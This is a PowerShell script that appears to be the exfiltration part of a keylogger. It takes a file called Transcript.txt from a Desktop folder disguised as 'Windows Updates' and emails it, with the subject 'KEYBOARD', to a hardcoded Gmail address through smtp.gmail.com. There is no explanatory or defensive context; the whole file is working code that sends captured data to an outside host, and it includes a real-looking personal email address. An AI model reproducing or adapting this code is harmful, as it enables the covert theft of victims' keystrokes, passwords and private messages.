
$Username = "orapajelmar@gmail.com";
$Password = "Enter App Password Here";
$path = "$($env:USERPROFILE)\Desktop\Windows Updates\Transcript.txt";

function Send-ToEmail([string]$email, [string]$attachmentpath){

    $message = new-object Net.Mail.MailMessage;
    $message.From = "orapajelmar@gmail.com";
    $message.To.Add($email);
    $message.Subject = "KEYBOARD";
    $message.Body = "Transcript";
    $attachment = New-Object Net.Mail.Attachment($attachmentpath);
    $message.Attachments.Add($attachment);

    $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", "587");
    $smtp.EnableSSL = $true;
    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
    $smtp.send($message);
    write-host "Mail Sent" ; 
    $attachment.Dispose();
 }
Send-ToEmail  -email "orapajelmar@gmail.com" -attachmentpath $path;
